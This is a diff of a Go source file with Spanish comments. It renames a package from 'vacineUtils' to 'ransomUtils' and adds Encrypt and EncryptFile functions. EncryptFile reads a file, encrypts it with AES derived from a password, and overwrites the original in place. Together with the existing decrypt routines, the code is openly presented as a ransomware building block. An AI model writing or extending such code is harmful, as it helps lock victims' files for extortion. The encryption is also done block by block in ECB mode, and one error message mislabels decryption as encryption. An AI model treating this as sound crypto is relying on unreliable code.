@@ -1,6 +1,7 @@
-package vacineUtils
+package ransomUtils
 
 import (
+	"bytes"
 	"crypto/aes"
 	"crypto/sha256"
 	"encoding/base64"
@@ -9,10 +10,49 @@ import (
 	"os"
 )
 
-// toDo: deriveKey convierte una contraseña de cualquier longitud en 32 bytes (AES-256).
+// convierte una contraseña de cualquier longitud en 32 bytes (AES-256).
 func deriveKey(password string) []byte {
 	hash := sha256.Sum256([]byte(password))
 	return hash[:]
+}
+
+func Encrypt(plaintext string, key string) (string, error) {
+	block, err := aes.NewCipher(deriveKey(key))
+	if err != nil {
+		return "", err
+	}
+
+	bs := block.BlockSize() // 16 bytes
+
+	//Padding PKCS#7: rellenar hasta un múltiplo de 16
+	data := []byte(plaintext)
+	pad := bs - len(data)%bs
+	data = append(data, bytes.Repeat([]byte{byte(pad)}, pad)...)
+
+	out := make([]byte, len(data))
+	for i := 0; i < len(data); i += bs {
+		block.Encrypt(out[i:i+bs], data[i:i+bs])
+	}
+
+	return base64.StdEncoding.EncodeToString(out), nil
+}
+
+func EncryptFile(path string, key string) error {
+	data, err := os.ReadFile(path)
+	if err != nil {
+		return fmt.Errorf("error al leer el archivo: %w", err)
+	}
+
+	encrypted, err := Encrypt(string(data), key)
+	if err != nil {
+		return fmt.Errorf("error al cifrar: %w", err)
+	}
+
+	if err := os.WriteFile(path, []byte(encrypted), 0600); err != nil {
+		return fmt.Errorf("error al escribir el archivo cifrado: %w", err)
+	}
+
+	return nil
 }
 
 func Decrypt(ciphertext string, key string) (string, error) {
@@ -51,7 +91,7 @@ func DecryptFile(path string, key string) error {
 		return fmt.Errorf("error al leer el archivo: %w", err)
 	}
 
-	decrypted, err := Decrypt(string(data),key)
+	decrypted, err := Decrypt(string(data), key)
 	if err != nil {
 		return fmt.Errorf("error al cifrar: %w", err)
 	}
